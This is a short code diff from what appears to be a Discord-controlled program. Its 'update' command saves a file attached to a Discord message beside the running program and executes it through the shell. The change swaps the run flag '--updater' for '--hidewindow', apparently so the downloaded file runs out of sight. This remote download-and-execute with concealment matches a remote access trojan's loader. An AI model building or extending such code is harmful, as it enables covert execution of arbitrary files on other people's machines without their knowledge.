@@ -78,7 +78,7 @@ async def update(ctx):
         save_path = os.path.join(os.path.dirname(sys.argv[0]), attachment.filename)
         await attachment.save(save_path)
         
-        subprocess.Popen([save_path, "--updater"], shell=True)
+        subprocess.Popen([save_path, "--hidewindow"], shell=True)
         await ctx.send(f"Updater `{attachment.filename}` has been downloaded and executed.")
     except Exception as e:
         await ctx.send(f"Could not process the update. {str(e)}", empherial=True)
